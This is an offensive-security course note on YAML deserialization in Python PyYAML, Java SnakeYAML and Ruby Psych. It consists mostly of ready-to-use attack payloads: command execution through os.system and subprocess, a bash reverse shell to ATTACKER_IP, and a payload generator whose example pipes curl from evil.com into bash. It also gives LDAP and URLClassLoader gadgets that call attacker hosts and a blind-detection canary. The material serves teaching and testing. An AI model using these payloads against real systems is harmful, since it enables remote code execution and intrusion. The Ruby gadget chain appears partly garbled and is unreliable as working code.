---
tags: [vapt, deserialization, yaml, intermediate]
difficulty: intermediate
module: "15 - Deserialization"
topic: "15.09 YAML Deserialization"
---

# 15.09 — YAML Deserialization

## Why YAML Is Dangerous

```
YAML SUPPORTS ARBITRARY OBJECT INSTANTIATION:
  !!python/object:mymodule.MyClass
  !!java.lang.ProcessBuilder
  !!ruby/object:Gem::Requirement
  
  These "tags" tell the YAML parser which class to instantiate.
  If untrusted YAML is parsed → arbitrary objects created → code execution!

VULNERABLE LIBRARIES:
  Python: PyYAML (yaml.load without Loader) → CRITICAL!
  Java:   SnakeYAML → arbitrary class instantiation
  Ruby:   Psych (default Ruby YAML) → code execution possible
```

---

## Python PyYAML RCE

```python
# VULNERABLE CODE:
import yaml

user_input = request.get_data(as_text=True)
data = yaml.load(user_input)  # ← DANGEROUS! No Loader specified
# OR:
data = yaml.load(user_input, Loader=yaml.Loader)  # Also dangerous!

# ATTACK PAYLOAD (executes id):
!!python/object/apply:os.system ["id"]

# MORE SOPHISTICATED PAYLOAD:
!!python/object/apply:subprocess.check_output [["id"]]

# REVERSE SHELL:
!!python/object/apply:subprocess.check_output 
  [["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]]

# OR USING exec:
!!python/object/apply:exec ["import os; os.system('id')"]

# TEST IF VULNERABLE (DNS ping):
!!python/object/apply:urllib.request.urlopen
  ["http://YOUR_BURP_COLLABORATOR.burpcollaborator.net/"]
```

---

## PyYAML One-Liner Generator

```python
# GENERATE PYYAML RCE PAYLOAD:
import sys

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
print(f'!!python/object/apply:subprocess.check_output [["{cmd}"]]')

# USAGE:
# python3 gen_yaml.py "id"
# → !!python/object/apply:subprocess.check_output [["id"]]

# python3 gen_yaml.py "curl http://evil.com/shell | bash"
```

---

## Java SnakeYAML

```java
// SNAKEYAML DEFAULT CONSTRUCTOR IS VULNERABLE:
Yaml yaml = new Yaml();  // default, no type restrictions!
Object obj = yaml.load(userInput);  // can instantiate ANY class!

// ATTACK PAYLOAD (execute command via ScriptEngine):
!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
  [!!byte[] [YmFzZS4uLg==], ...]

// SIMPLER: Use Spring-based gadget:
!!org.springframework.beans.factory.config.PropertyPathFactoryBean
  {targetBeanName: "ldap://ATTACKER:1389/Exploit", propertyPath: "foo"}

// GENERATES LDAP LOOKUP → RCE via marshalsec!

// ALSO: javax.script.ScriptEngine:
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://evil.com/"]
  ]]
]
```

---

## Ruby YAML (Psych) RCE

```ruby
# RUBY YAML IS BASED ON PSYCH LIBRARY:
# Vulnerable if parsing untrusted YAML

# CLASSIC RUBY YAML RCE (using Gem::Requirement gadget):
require 'yaml'

payload = "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/sym :version\n- !ruby/object:Gem::Version\n  version: '0'\n"
YAML.load(payload)

# MORE DIRECT (if OS command execution available):
# !ruby/object:Net::WriteAdapter
#   socket: !ruby/object:Gem::Package::TarReader
#     io: &1 !ruby/object:Net::BufferedIO
#       io: &1 !ruby/object:Gem::Package::TarReader::Entry
#         read: 0
#         header: "abc"
#   method_id: :puts

# TOOL: Generate Ruby Marshal gadget that works via YAML
```

---

## Detecting YAML Injection

```bash
# STEP 1: FIND YAML PARSING:
# Look for .yml file uploads, YAML API bodies, config imports

# STEP 2: INJECT MINIMAL TEST:
# Send: !!python/object/apply:os.getcwd []
# If response contains path string → VULNERABLE!

# STEP 3: DNS CANARY:
# Send: !!python/object/apply:urllib.request.urlopen ["http://YOUR_COLLAB.burpcollaborator.net/"]
# If Collaborator receives request → BLIND YAML RCE!

# STEP 4: ESCALATE:
# Use os.system or subprocess.check_output for actual command execution

# AUTOMATED TESTING:
# Burp Active Scanner checks for YAML injection in some configurations
# Manual: inject in any field that might be YAML-parsed
```

---

## Related Notes
- [[04 - Python Pickle Deserialization]] — Python code execution comparison
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[12 - Defense Avoid Untrusted Deserialization]] — use SafeLoader!
